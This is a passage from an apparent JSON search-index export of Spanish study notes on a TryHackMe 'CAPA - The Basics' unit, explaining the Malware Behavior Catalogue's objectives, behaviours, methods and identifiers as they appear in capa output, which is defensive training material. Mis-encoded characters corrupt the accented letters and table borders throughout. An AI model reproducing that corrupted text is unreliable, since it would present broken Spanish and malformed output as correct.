‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ reference Base64 string                   ‚îÇ data-manipulation/encoding/base64 ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\nLa explicaci√≥n:\n\n| Etiqueta                | Valor                           | Explicaci√≥n                                                                                                                     |\n| ----------------------- | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |\n| Capability              | **reference base64 string**     | El malware tiene la habilidad de codificar informaci√≥n usando Base64.                                                           |\n| Top-Level Namespace     | **data-manipulation**           | Contiene un conjunto de reglas que rige los comportamientos involucrados en la alteraci√≥n de informaci√≥n (data transformation). |\n| Namespace               | **encoding/base64**             | Consiste en las reglas para encodear y decodear usando Base64 y XOR.                                                            |\n| Rule YAML File Matched? | **reference-base64-string.yml** | Recuerda que en casi todos los casos el nombre de la regla es el nombre de la Capability con guiones en lugar de espacios.      |\n\nSabiendo esta informaci√≥n podemos concretar que el archivo usa el esquema de encodeado Base64.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Dissecting CAPA Results Part 2 - Malware Behavior Catalogue",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/4-dissecting-capa-results-part-2-malware-behavior-catalogue/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/4. Dissecting CAPA Results Part 2 - Malware Behavior Catalogue.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "En esta tarea cubriremos los siguientes t√≥picos:\n\n- MBC\n- Objective\n- Micro-Objective\n- MBC Behaviours\n- Micro-Behaviour\n- Methods\n\n```powershell\n‚îç‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îØ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îë\n‚îÇ MBC Objective               ‚îÇ MBC Behavior                                    ‚îÇ\n‚îù‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îø‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î•\n‚îÇ ANTI-BEHAVIORAL ANALYSIS    ‚îÇ Virtual Machine Detection [B0009]               |\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ ANTI-STATIC ANALYSIS        ‚îÇ Executable Code Obfuscation::Argument           |\n|                             | Obfuscation [B0032.020]                         |\n‚îÇ                             ‚îÇ Executable Code Obfuscation::Stack Strings      ‚îÇ\n|                             | [B0032.017]                                     |\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ COMMUNICATION               ‚îÇ HTTP Communication [C0002]                      |\n‚îÇ                             ‚îÇ HTTP Communication::Read Header [C0002.014]     ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ DATA                        ‚îÇ Check String [C0019]                            |\n‚îÇ                             ‚îÇ Encode Data::Base64 [C0026.001]                 |\n‚îÇ                             ‚îÇ Encode Data::XOR [C0026.002]                    |\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ DEFENSE EVASION             ‚îÇ Obfuscated Files or Information::Encoding-      |\n|                             | Standard Algorithm [E1027.m02]                  |\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ DISCOVERY                   ‚îÇ File and Directory Discovery [E1083]            ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ EXECUTION                   ‚îÇ Command and Scripting Interpreter [E1059]       ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ FILE SYSTEM                 ‚îÇ Create Directory [C0046]                        ‚îÇ\n‚îÇ                             ‚îÇ Delete File [C0047]                             ‚îÇ\n‚îÇ                             ‚îÇ Read File [C0051]                               ‚îÇ\n‚îÇ                             ‚îÇ Writes File [C0052]                             ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ MEMORY                      ‚îÇ Allocate Memory [C0007]                         ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ PROCESS                     ‚îÇ Create Process [C0017]                          ‚îÇ\n‚îï‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î∑‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îô\n```\n\nAfrontaremos el Cat√°logo de Comportamiento de Malware (Malware Behavior Catalogue MBC) para entender mejor el bloque de arriba.\n\n---------------------------\n<h2>Malware Behavior Catalogue (MBC)</h2>\nMBC est√° dise√±ado para soportar varios aspectos del an√°lisis de malware, como etiquetaci√≥n, an√°lisis de similaridad y reporte estandarizado. Sirve como un cat√°logo de los objetivos y comportamientos del malware. Tambi√©n puede relacionar m√©todos ATT&CK y registrar comportamientos y funcionalidades de c√≥digo descubiertas durante el an√°lisis. Es importante recalcar que los nombres de los comportamientos MBC pueden, o no, corresponder con t√©cnicas ATT&CK.\n\nEl contenido de MBC se puede representar en dos formatos:\n\n| Formato                                                 | Ejemplo                                                                             | Explicaci√≥n                                                                                                                                                         |\n| ------------------------------------------------------- | ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **OBJECTIVE**::**Behavior**::**Method**[**Identifier**] | ANTI-STATIC ANALYSIS::Executable Code Obfuscation::Argument Obfuscation [B0032.020] | **Anti-static Analysis** = OBJETIVO  <br>**Executable Code Obfuscation** = COMPORTAMIENTO  <br>**Argument Obfuscation** = M√âTODO  <br>**BOO32.020** = IDENTIFICADOR |\n| **OBJECTIVE**::**Behavior**::[**Identifier**]           | COMMUNICATION::HTTP Communication:: [C0002]                                         | **COMMUNICATION** = OBJETIVO  <br>**HTTP Communication** = COMPORTAMIENTO  <br>**C0002** = IDENTIFICADOR                                                            |\n\nLa diferencia entre los dos formatos es que el primer formato contiene detalles adicionales  (m√©todo, que tambi√©n se puede acu√±ar como sub-t√©cnica).\n\n---------------------------------------\n<h2>Objetivo</h2>\nEl objetivo se basa en las t√°cticas ATT&CK en el contexto del comportamiento del malware. Adem√°s, MBC tiene an√°lisis anti-comportamiento y anti-est√°tico. Estos objetivos est√°n dise√±ados para el an√°lisis de malware con el caso de uso de \"**characterizing malware**\". En la tabla de abajo hay una explicaci√≥n de cada una.\n\n| **Objective**                | **Explanation**                                                                                                                                                      |\n| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **Anti-Behavioral Analysis** | El malware intenta evitar la detecci√≥n obstaculizando el an√°lisis con herramientas como entornos sandbox o depuradores.                                              |\n| **Anti-Static Analysis**     | El malware intenta obstruir o a√±adir complejidad a los an√°lisis est√°ticos haciendo m√°s dif√≠cil para los analistas entender el c√≥digo.                                |\n| **Collection**               | El malware se enfoca en identificar y recopilar informaci√≥n de la m√°quina o red objetivo.                                                                            |\n| **Command and Control**      | El malware suele establecer comunicaci√≥n mediante m√©todos como servidores C2, , redes P2P, etc. Esto permite a los atacantes controlar los sistemas comprometidos.   |\n| **Credential Access**        | El objetivo principal del malware es robar credenciales, como contrase√±as y nombres de usuario.                                                                      |\n| **Defense Evasion**          | El malware intenta bypassear y circunvalar los varios sistemas de detecci√≥n y medidas de seguridad para evitar ser detectado.                                        |\n| **Discovery**                | El malware busca recolectar informaci√≥n detallada sobre la configuraci√≥n y setup del sistema o la red en cuesti√≥n (incluyendo software, hardware e infraestructura). |\n| **Execution**                | El malware est√° dise√±ado para ejecutar comandos o c√≥digo no autorizados en la m√°quina de la v√≠ctima sin su consentimiento.                                           |\n| **Exfiltration**             | Est√° dise√±ado para infiltrarse en sistemas o redes y robar y extraer informaci√≥n sensible.                                                                           |\n| **Impact**                   | Intenta manipular, modificar o da√±ar sistemas o informaci√≥n.                                                                                                         |\n| **Lateral Movement**         | Busca expandirse a trav√©s de la red, pasiva o activamente.                                                                                                           |\n| **Persistence**              | Dise√±ado espec√≠ficamente con la capacidad de permanecer in detectado y operativo en un sistema durante un periodo extenso de tiempo.                                 |\n| **Privilege Escalation**     | Busca infiltrarse en un sistema o red para ganar privilegios elevados                                                                                                |\n\n-----------------------------------\n<h2>Micro-Objetivos</h2>\nSe asocian con los micro-comportamientos, que se refieren a acciones exhibidas por software potencialmente malicioso que no necesariamente lo es y puede servir para otros objetivos. Sin embargo es importante recalcar que estos comportamientos pueden ser abusados. Es por esto que CAPA puede marcarlos como positivos.\n\n| **Micro-Objectivo** | **Descripci√≥n**                                                                                                                       |\n| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |\n| **PROCESS**         | Exhibir comportamientos como, pero no limitados a, crear procesos, configurar contexto de hilos, terminar procesos y comprobar mutex. |\n| **MEMORY**          | Exhibir comportamientos como, pero no limitados a, asignar memoria, cambiar protecci√≥n de memoria y liberar memoria.                  |\n| **COMMUNICATION**   | Exhibir comportamientos como, pero no limitados a, tr√°fico (DNS, FTP, HTTP, ICMP, SMTP).                                              |\n| **DATA**            | Exhibir comportamientos como, pero no limitados a, comprobar strings, comprimir, codificar y descodificar informaci√≥n.                |\n\nEl output final de CAPA, Objetivo y Micro-Objetivo se muestra s√≥lo debajo de la columna **Objective**.\n\n----------------------------------\n<h2>Comportamientos MBC</h2>\nLa columna MBC Behaviors contiene los comportamientos y micro-comportamientos con o sin sus m√©todos e identificadores. Puedes ver una lista de todo el contenido MBC [aqu√≠](https://github.com/MBCProject/mbc-markdown/blob/main/mbc_summary.md).\n\nAqu√≠ debajo mostramos la versi√≥n comprimida de los comportamientos, micro-comportamientos e identificadores.\n\n| **Objectivo**                         | **Comportamiento**                    | Identificador | Explicaci√≥n                                                                                                                     |\n| ------------------------------------- | ------------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------------- |\n| ANTI-BEHAVIORAL ANALYSIS              | **Virtual Machine Detection**         | **B0009**     | El malware comprueba si est√° corriendo en un entorno virtual. Durante este proceso examina artefactos del usuario y el sistema. |\n| ANTI-STATIC ANALYSIS                  | **Executable Code Obfuscation**       | **B0032**     | C√≥digo ejecutable ha sido obscurizado para obstaculizar el an√°lisis del c√≥digo.                                                 |\n| EXECUTION                             | **Command and Scripting Interpreter** | **E1059**     | El malware puede explotar int√©rpretes de comandos y scripts para ejecutar comandos, scripts o binarios.                         |\n| DISCOVERY                             | **File and Directory Discovery**      | **E1083**     | El malware tiene la capacidad de buscar archivos espec√≠ficos enumerando archivos y directorios.                                 |\n| ANTI-STATIC ANALYSIS, DEFENSE EVASION | **Obfuscated Files or Information**   | **E1027**     | El malware puede ofuscar archivos encodeando o encriptando.                                                                     |\n\n----------------------------------------\n<h2>Micro-Comportamientos</h2>\nEl t√©rmino \"low-level behaviors\" en el an√°lisis de malware se refiere a acciones exhibidas por malware que no son necesariamente maliciosas y pueden servir otros prop√≥sitos. Es importante recalcar que no porque un comportamiento est√© categorizado como micro-comportamiento es inofensivo.\n\n| Micro-Objetivo | Micro-Comportamiento   | Identificador | Explicaci√≥n                                                                                                                                             |\n| -------------- | ---------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| MEMORY         | **Allocate Memory**    | **C0007**     | El malware frecuentemente utiliza asignaci√≥n de memoria como parte de su estrategia para desempaquetarse y ejecutar actividades maliciosas.             |\n| PROCESS        | **Create Process**     | **C0017**     | El malware crea un proceso mediante WMI  shellcode. Tambi√©n puede crear un proceso suspendido (segundo plano).                                          |\n| COMMUNICATION  | **HTTP Communication** | **C0002**     | El malware es capaz de iniciar comunicaciones HTTP.                                                                                                     |\n| DATA           | **Check String**       | **C0019**     | El malware puede inspeccionar una string para identificar caracter√≠sticas como contenido ASCII, n√∫meros de tarjetas de cr√©dito y longitud de la string. |\n| DATA           | **Encode Data**        | **C0026**     | El malware tiene la capacidad de encodear informaci√≥n usando Base64 o XOR.                                                                              |\n| FILE SYSTEM    | **Create Directory**   | **C0046**     | El malware puede crear un directorio.                                                                                                                   |\n| FILE SYSTEM    | **Delete File**        | **C0047**     | El malware tiene la capacidad de borrar un archivo.                                                                                                     |\n| FILE SYSTEM    | **Read File**          | **C0051**     | El malware puede leer un archivo.                                                                                                                       |\n| FILE SYSTEM    | **Writes File**        | **C0052**     | El malware tiene la capacidad de escribir un archivo.                                                                                                   |\n\nEL output final de CAPA, Comportamiento y Micro-Comportamiento se muestran s√≥lo debajo de la columna **Behavior**.\n\n-------------------------------\n<h2>M√©todos</h2>\nPor √∫ltimo, miraremos los M√©todos. Debajo est√°n algunos de los m√©todos incluidos en los resultados del ejemplo anterior. Los m√©todos est√°n relacionados con los comportamientos.\n\n| Comportamiento                  | M√©todo o sub-t√©cnica            | Identificador | Explicaci√≥n                                                                                                         |\n| ------------------------------- | ------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------- |\n| Executable Code Obfuscation     | **Argument Obfuscation**        | B0032.020     | N√∫meros simples o argumentos de string se calculan en el momento de la ejecuci√≥n, haciendo m√°s dif√≠cil el an√°lisis. |\n| Executable Code Obfuscation     | **Stack Strings**               | B0032.017     | Construir y descifrar strings en el stack en cada uso y despu√©s descartarlas para evitar futuras referencias        |\n| HTTP Communication              | **Read Header**                 | C0002.014     | Header de lectura HTTP.                                                                                             |\n| Encode Data                     | **Base64**                      | C0026.001     | El malware podr√≠a codificar informaci√≥n en Base64.                                                                  |\n| Encode Data                     | **XOR**                         | C0026.002     | El malware podr√≠a usar XOR para codificar la informaci√≥n.                                                           |\n| Obfuscated Files or Information | **Encoding-Standard Algorithm** | E1027.m02     | Codificar pruebas de malware, archivos u otra informaci√≥n usa un algoritmo est√°ndar (ej: Base64).                   |\n\nAhora que tenemos una vista y entendimiento amplios de los contenidos MBC, deber√≠amos ser capaces de explicar el resultado del ejemplo anterior. Vamos a hacer un repaso usando uno de los resultados:\n\n```powershell\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ MBC Objective               ‚îÇ MBC Behavior                     ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n| DATA                        ‚îÇ Encode Data::Base64 [C0026.001]  ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n| Etiqueta      | Valor           | Explicaci√≥n                                                                                                            |\n| ------------- | --------------- | ---------------------------------------------------------------------------------------------------------------------- |\n| MBC Objective | **DATA**        | Exhibir comportamientos como, pero no limitados a, comprobar strings, comprimir, codificar y descodificar informaci√≥n. |\n| MBC Behavior  | **Encode Data** | Tiene la habilidad para codificar informaci√≥n usando Base64 y XOR.                                                     |\n| Method        | **Base64**      | El malware podr√≠a encodear informaci√≥n usando Base64.                                                                  |\n| Identifier    | **C0026.001**   | Da informaci√≥n sobre el comportamiento. Tambi√©n sirve como etiqueta.                                                   |\nSabiendo estas informaci√≥n puedes decir que el archivo puede usar un esquema de codificaci√≥n Base64.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Tool Overview - How CAPA Works",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/2-tool-overview-how-capa-works/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/2. Tool Overview - How CAPA Works.md",
